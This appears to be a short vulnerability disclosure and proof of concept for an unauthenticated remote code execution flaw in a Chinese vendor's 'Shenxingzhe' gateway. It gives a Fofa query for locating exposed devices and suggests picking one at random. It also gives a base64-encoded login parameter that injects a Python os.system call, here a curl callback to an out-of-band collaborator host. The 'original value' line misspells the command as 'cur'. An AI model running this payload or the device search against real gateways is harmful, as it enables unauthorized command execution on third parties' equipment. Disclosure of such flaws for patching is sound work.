# The-gateway-of-the-Smart-Walker-is-not-authorized-for-remote-code-execution-RCE-
The Shenxingzhe gateway of Changsha Tongxun Computer Technology Co., Ltd. has an unauthorized remote code execution (RCE) vulnerability
Fofa：cert.sn="9371290284317297864" &&title="网关"
Choose any asset at random
https://example.75:4433/login/?nLang=0
<img width="832" height="508" alt="image" src="https://github.com/user-attachments/assets/42cc1d01-f0f9-4c04-a067-7697ae10ecbe" />

Payload and chkid are base64 encoded
https://example:4433/?title=1&oIp=1&chkid=eydzVXNlckNvZGUnOiBfX2ltcG9ydF9fKCdvcycpLnN5c3RlbSgnY3VybCBuamFleHFxdHZmZTNoOXYzazVqbGFlaTJ5dDRrc2JnMC5vYXN0aWZ5LmNvbScpLCAnc1B3ZCc6IDB9

original value：
{'sUserCode': __import__('os').system('cur njaexqqtvfe3h9v3k5jlaei2yt4ksbg0.oastify.com'), 'sPwd': 0}
<img width="832" height="288" alt="image" src="https://github.com/user-attachments/assets/7e673f05-3b1c-4fdd-a669-87272484cce2" />

Payload function:
Next, try executing a system command to request my DNS logs
<img width="830" height="152" alt="image" src="https://github.com/user-attachments/assets/4b4dc083-cc6a-468f-9860-cb4e74c13455" />

Check the DNSlog and confirm that the request has been successfully received
Successful command execution
<img width="830" height="130" alt="image" src="https://github.com/user-attachments/assets/15eb76f7-1f4a-48e7-8bde-0e805e2cde44" />
